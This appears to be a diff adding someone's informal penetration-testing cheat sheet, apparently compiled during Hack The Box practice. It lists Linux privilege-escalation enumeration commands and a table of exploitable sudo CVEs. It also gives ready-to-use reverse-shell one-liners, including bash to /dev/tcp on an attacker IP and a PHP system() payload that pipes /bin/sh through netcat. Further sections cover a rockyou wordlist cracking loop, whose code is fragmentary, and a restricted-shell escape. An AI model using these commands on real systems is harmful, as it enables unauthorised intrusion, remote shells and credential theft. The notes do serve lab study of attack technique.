@@ -1,0 +1,111 @@
+ENUMERATION I HAVENT FIGURED OUT _____________________________________________________
+FIRST LIST ALL TEH BLOCK DEVICES:
+lsblk 
+THEN CREATE THE ONE THAT IS POINTING TO THE ROOT FILE SYSTEM
+mknod /dev/rootfs b 253 0
+mknod → creates a device file in /dev.
+
+/dev/rootfs → the name of the new device file.
+
+b → it’s a block device (like a disk or LVM volume).
+253 → major number (tells Linux to use the device-mapper driver).
+0 → minor number (selects the first logical volume, here your root LV).
+✅ In short: “Make a device file /dev/rootfs that points to the first LVM logical volume (root filesystem) managed by the device-mapper.”
+
+POSSIBLE ENUMERNATION TECHNIQUES  ---VVVVIMP
+id; whoami; hostnamectl
+sudo -l
+ss -tulnp | grep LISTEN
+ls -la /var/backups
+Local enumeration
+Quick checks
+id, whoami, hostname to confirm user
+ls -la /home/ike and check .ssh for private keys
+find / -perm -4000 -type f 2>/dev/null to list SUID/SGID binaries
+Examine /etc/passwd, /etc/group, and sudo permissions
+
+
+VULNERBEL SUDO VERSIONS 
+CVE ID	Vulnerable Sudo Versions	Key Exploitation Detail
+CVE-2025-32463	1.9.14 to 1.9.17	"chroot to root": any local user can gain root access with the -R (chroot) option; default configuration is vulnerable.
+CVE-2021-3156	1.8.2 to 1.8.31p2
+1.9.0 to 1.9.5p1	"Baron Samedit": heap-based buffer overflow via sudoedit -s; exploitable by any local user without being in sudoers file.
+CVE-2023-22809	1.8.0 to 1.9.12p1	sudoedit mishandles arguments in environment variables (SUDO_EDITOR, etc.), allowing appending of arbitrary files like /etc/sudoers.
+CVE-2019-14287	Before 1.8.28	Allows user to run commands as root by specifying user ID -1 or 4294967295 if sudoers rule uses ALL and explicitly denies root.
+CVE-2025-32462	1.8.8 to 1.9.17	"Policy-Check Flaw": -h (host) option can bypass host checks, allowing commands as root if specific host rules exist.
+
+
+
+___________________________________________________________________________________________
+
+TO CHECK FOR WHAT FILES ARE READABKE FOR TEH CURRENT USER find / -maxdepth 1 -readable  2>/dev/null
+
+ps aux | grep -vE "(\]|\[|/sbin/|/lib/|/usr/sbin/|snapd|udev|systemd|accounts-daemon|avahi|dbus|rtkit|whoopsie|irqbalance|networkd|rsyslogd|acpid|cron|atd|sshd|ntpd|vmtoolsd|nscd|polkitd|rpc|gvfs|dconf|hp-|kerneloops|abrt|wpa_supplicant|ModemManager|thermald|lm-sensors|lsmd|fwupd|packagekitd|udisksd|upowerd|gnome-|gdm|Xorg|lightdm|sddm|plymouthd|apache2|nginx|www-data)" | grep -v "grep" | head -n 20
+OR
+ps -ef --forest | less -S
+less -S → open a scrollable pager that does horizontal scrolling instead of wrapping long lines.
+
+check for listening ports netstat -ntlp
+port transfrer
+ssh -L 8080:127.0.0.1:8080 user@sea.htb
+-L: Stands for "Local" port forwarding.
+
+8080: The port on your local machine (Kali) where the service will be available.
+
+127.0.0.1:8080: The destination on the remote server (sea.htb) that you want to access. (It's localhost from the server's perspective).
+
+user@sea.htb: The username and hostname for your SSH login.
+
+
+
+INTERACTIVE TERMINAL AFTER NECTCAT                    IF PYTHON IS NOT INSTALLED USE script -qc /bin/bash /dev/null
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+ ^Z
+stty raw -echo; fg
+ export TERM=xterm         
+
+ FIX TERMINAL 
+ stty -a
+ stty rows ___ cols ___
+
+files and processes both are important,
+rlogin allows the user to login to get the users file we need to get access as any user on the target, loging in as sadm was not anything better it was luck we got the password there and then we could sudo -l to find the provillages.
+
+python3 myfirstscript.py>hash.txt
+
+starting a docker shell
+
+sudo docker exec -u root --privileged -it e6ff5b1cbc85 bash
+
+php
+1)escape shell command- puts a \ before `, |, ;, &, >, <, ! etc
+
+REVERSE SHELLS
+NETCAT (nc -normal one ncat- the more powerful nmap version)
+-o output.txt. redirect all input and output to this file
+-e /bin/bash start a bash terminal directly instead of using the reverse shell manually (-e means pipe input and output through this) [the issue is that its not available for most nc versions because of the risk)# Target Machine: Connect to the attacker and hook up bash
+/bin/bash -i > /dev/tcp/ATTACKER_IP/4444 0>&1 2>&1- the manual way
+bash -c 'bash -i >& /dev/tcp/10.10.15.0/4444 0>&1'
+
+open a reverse shell using php 
+<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 9090>/tmp/f'); ?>
+
+
+As we don't know the master password, we can use
+a password wordlist like Rockyou----IMP
+
+code to use rockyou to get the password 
+words = open("/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords1000.txt", 'r', errors="ignore").readlines()
+for word in words:
+encrypted_file_to_lines('pswm', word.strip())
+
+
+
+
+word=open("/usr/share/wordlists/rockyou.txt",'r',errors="ignore").readlines()
+
+
+BREAKING OUT OF A RESTRUCTED SHELL ENVIROMENT 
+It can be used to break out from restricted environments by spawning an interactive system shell.
+
+echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
